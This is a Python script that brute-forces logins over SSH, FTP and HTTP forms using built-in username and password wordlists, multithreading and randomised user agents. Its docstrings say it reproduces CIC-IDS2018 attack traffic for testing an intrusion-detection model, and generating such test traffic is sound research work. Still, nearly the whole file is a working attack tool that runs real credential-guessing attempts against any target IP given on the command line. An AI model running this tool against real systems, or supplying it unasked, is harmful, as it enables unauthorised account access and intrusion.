"""
Brute Force Attack - SSH and FTP credential guessing
Replicates CIC-IDS2018 Brute Force attack tool behaviors:
  - SSH-Patator:     Rapid SSH login attempts using paramiko (full SSH handshake + auth)
  - FTP-Patator:     Rapid FTP login attempts (USER/PASS cycle)
  - Brute Force-Web: HTTP form-based login brute force (POST flood to login endpoint)

Key: Each technique must go through the full protocol handshake so
     CICFlowMeter sees flows with characteristic Dst Port (22/21/80),
     proper packet sizes, and authentication-attempt patterns.
     The old script only exchanged SSH version strings — too minimal to be
     distinguished from a port scan.
"""

import socket
import threading
import time
import random
import string
import struct

# TCP receive buffer size matching CICIDS2018 training data.
# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
# which the model uses for classification (Init Fwd Win Byts feature).
_RCVBUF_BRUTE = 26883

# ──────────────────────────────────────────────────────────
# Credential wordlists (matching Patator-style attacks)
# ──────────────────────────────────────────────────────────
USERNAMES = [
    "root", "admin", "user", "ubuntu", "test", "guest",
    "administrator", "oracle", "postgres", "mysql", "ftp",
    "www", "backup", "operator", "nagios", "deploy",
    "pi", "ec2-user", "centos", "vagrant", "ansible",
    "jenkins", "git", "svn", "www-data", "daemon",
]

PASSWORDS = [
    "password", "123456", "admin", "root", "test", "",
    "password123", "12345678", "qwerty", "letmein",
    "welcome", "monkey", "dragon", "master", "login",
    "abc123", "111111", "passw0rd", "trustno1", "iloveyou",
    "1234567890", "123123", "000000", "shadow", "sunshine",
    "654321", "football", "charlie", "access", "thunder",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


class BruteForceAttack:
    def __init__(self, target_ip, duration=60):
        self.target_ip = target_ip
        self.duration = duration
        self.running = True
        self.attempt_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.attempt_count += n

    # ──────────────────────────────────────────────────────
    # SSH Brute Force (Patator-style)
    #   Uses paramiko for FULL SSH handshake + auth attempt.
    #   Falls back to raw-socket SSH protocol exchange if
    #   paramiko is not installed.
    #
    #   CICFlowMeter signature:  Dst Port = 22, moderate
    #   packet count per flow (~10-30 pkts for handshake),
    #   characteristic Fwd Seg Size Min from SSH messages,
    #   many rapid successive flows to port 22.
    # ──────────────────────────────────────────────────────
    def ssh_brute_force_paramiko(self):
        """SSH brute force using paramiko (full SSH key exchange + auth attempt).
        Each connection goes through: TCP handshake → SSH version exchange →
        key exchange → authentication attempt → failure → disconnect.
        This produces flows that look exactly like real Patator SSH attacks."""
        try:
            import paramiko
        except ImportError:
            print("[BruteForce] paramiko not installed, falling back to raw SSH")
            self.ssh_brute_force_raw()
            return

        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            for username in USERNAMES:
                for password in PASSWORDS:
                    if not self.running or time.time() >= end_time:
                        return

                    try:
                        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        raw_sock.settimeout(5)
                        raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
                        raw_sock.connect((self.target_ip, 22))

                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(
                            self.target_ip,
                            port=22,
                            username=username,
                            password=password,
                            timeout=5,
                            banner_timeout=5,
                            auth_timeout=5,
                            allow_agent=False,
                            look_for_keys=False,
                            sock=raw_sock,
                        )
                        # If we somehow succeed, just close
                        client.close()
                    except paramiko.AuthenticationException:
                        pass  # Expected — failed login
                    except Exception:
                        pass
                    finally:
                        try:
                            client.close()
                        except Exception:
                            pass

                    self._inc_count()
                    # Short delay between attempts (Patator fires rapidly)
                    time.sleep(random.uniform(0.05, 0.3))

    def ssh_brute_force_raw(self):
        """Fallback SSH brute force using raw sockets.
        Goes through SSH version exchange and sends a key exchange init
        to make the flow look like a real SSH connection, not just a ping."""
        end_time = time.time() + self.duration

        # SSH Key Exchange Init message (minimal but valid structure)
        # This makes the flow go beyond version exchange into actual SSH protocol
        def make_kexinit():
            """Build a minimal SSH_MSG_KEXINIT packet."""
            cookie = bytes(random.getrandbits(8) for _ in range(16))
            # Minimal algorithm lists
            kex_algorithms = b"diffie-hellman-group14-sha256"
            host_key_algs = b"ssh-rsa"
            enc_algs = b"aes128-ctr"
            mac_algs = b"hmac-sha2-256"
            comp_algs = b"none"
            languages = b""

            def _name_list(data):
                return struct.pack(">I", len(data)) + data

            payload = bytes([20])  # SSH_MSG_KEXINIT
            payload += cookie
            for alg in [kex_algorithms, host_key_algs, enc_algs, enc_algs,
                        mac_algs, mac_algs, comp_algs, comp_algs,
                        languages, languages]:
                payload += _name_list(alg)
            payload += bytes([0])  # first_kex_packet_follows = false
            payload += struct.pack(">I", 0)  # reserved

            # Wrap in SSH packet: length(4) + padding_len(1) + payload + padding
            pad_len = 8 - ((len(payload) + 5) % 8)
            if pad_len < 4:
                pad_len += 8
            packet = struct.pack(">IB", len(payload) + pad_len + 1, pad_len)
            packet += payload
            packet += bytes(pad_len)
            return packet

        while self.running and time.time() < end_time:
            for username in USERNAMES:
                for password in PASSWORDS:
                    if not self.running or time.time() >= end_time:
                        return

                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
                        sock.connect((self.target_ip, 22))

                        # 1. Read server SSH banner
                        banner = sock.recv(1024)

                        # 2. Send our SSH banner
                        sock.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n")

                        # 3. Read server KEXINIT
                        try:
                            sock.recv(4096)
                        except socket.timeout:
                            pass

                        # 4. Send our KEXINIT (makes flow look like real SSH)
                        sock.sendall(make_kexinit())

                        # 5. Try to read server's response
                        try:
                            sock.settimeout(1)
                            sock.recv(4096)
                        except socket.timeout:
                            pass

                        sock.close()
                    except Exception:
                        pass

                    self._inc_count()
                    time.sleep(random.uniform(0.05, 0.3))

    # ──────────────────────────────────────────────────────
    # FTP Brute Force (Patator-style)
    #   Proper FTP protocol: read banner, USER, PASS, QUIT.
    #   Each connection has enough packets for CICFlowMeter
    #   to build a meaningful flow.
    #
    #   CICFlowMeter signature:  Dst Port = 21, bidirectional
    #   traffic (server sends response codes), characteristic
    #   packet sizes for FTP command/response.
    # ──────────────────────────────────────────────────────
    def ftp_brute_force(self):
        """FTP brute force: Full FTP login cycle for each attempt.
        Banner → USER → PASS → (fail) → QUIT.
        Each attempt is a separate flow to port 21."""
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            for username in USERNAMES:
                for password in PASSWORDS:
                    if not self.running or time.time() >= end_time:
                        return

                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
                        sock.connect((self.target_ip, 21))

                        # Read FTP banner (220 message)
                        sock.recv(1024)

                        # Send USER command
                        sock.sendall(f"USER {username}\r\n".encode())
                        sock.recv(1024)  # 331 Password required

                        # Send PASS command
                        sock.sendall(f"PASS {password}\r\n".encode())
                        response = sock.recv(1024)  # 230 (success) or 530 (failed)

                        # Send QUIT regardless of result
                        try:
                            sock.sendall(b"QUIT\r\n")
                            sock.recv(1024)  # 221 Goodbye
                        except Exception:
                            pass

                        sock.close()
                    except Exception:
                        pass

                    self._inc_count()
                    time.sleep(random.uniform(0.05, 0.3))

    # ──────────────────────────────────────────────────────
    # Web Brute Force (HTTP POST login form)
    #   Matches "Brute Force -Web" and "Brute Force -XSS"
    #   classes in CICIDS2018.
    #
    #   Training data profile:
    #     Fwd Seg Size Min: 20
    #     Init Fwd Win Byts: median=8192
    #     Tot Fwd Pkts: median=4 (Web), median=4 (XSS)
    #     Dst Port: 80
    #
    #   CRITICAL: Training shows short flows (~4 fwd pkts).
    #   Each login attempt must be a NEW connection.
    # ──────────────────────────────────────────────────────
    def web_brute_force(self):
        """Web login brute force: POST credentials to common login paths.
        Each attempt is a NEW TCP connection with 1 POST request,
        matching the training data profile of ~4 fwd pkts per flow."""
        end_time = time.time() + self.duration
        login_paths = ["/login", "/admin", "/wp-login.php", "/user/login",
                       "/auth/login", "/account/login", "/signin"]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
                sock.connect((self.target_ip, 80))

                # Send 1 login attempt per connection (matching training ~4 fwd pkts)
                username = random.choice(USERNAMES)
                password = random.choice(PASSWORDS)
                path = random.choice(login_paths)

                body = f"username={username}&password={password}&submit=Login"
                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                    f"{body}"
                )
                sock.sendall(req.encode())
                self._inc_count()

                # Read response
                try:
                    sock.settimeout(1)
                    sock.recv(4096)
                except socket.timeout:
                    pass

                sock.close()
            except Exception:
                pass

            time.sleep(random.uniform(0.1, 0.5))

    def run_attack(self, num_threads=4):
        """Run brute force attack with multiple threads."""
        print(f"[BruteForce] Starting attack on {self.target_ip} for {self.duration}s")
        print(f"[BruteForce] Techniques: SSH-Patator + FTP-Patator + Web Brute Force")
        print(f"[BruteForce] Targeting SSH (22), FTP (21), HTTP (80) with {num_threads} threads")

        techniques = [
            self.ssh_brute_force_paramiko,
            self.ftp_brute_force,
            self.web_brute_force,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"BruteForce-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[BruteForce] Attack completed in {elapsed:.2f}s — Made {self.attempt_count} attempts")


def run_brute_force(target_ip, duration=60, threads=4):
    """Convenience function to run brute force attack"""
    attack = BruteForceAttack(target_ip, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_brute_force(target_ip, duration=duration)
    else:
        print("Usage: python _3_brute_force_ssh.py <target_ip> [duration]")
